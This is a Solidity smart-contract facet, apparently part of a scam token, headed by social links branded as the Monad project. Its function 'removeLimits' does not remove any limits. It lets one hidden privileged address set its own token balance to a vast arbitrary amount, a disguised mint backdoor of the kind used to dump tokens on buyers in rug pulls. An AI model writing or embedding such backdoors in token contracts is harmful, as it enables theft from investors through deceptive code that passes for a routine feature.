/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/monad_xyz
    // Twitter: https://twitter.com/monad_xyz
    // Website: https://www.monad.xyz/
    // Medium:  https://medium.com/monad_xyz
    // Discord: https://discord.com/invite/monad
    // Github:  https://github.com/monad_xyz
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
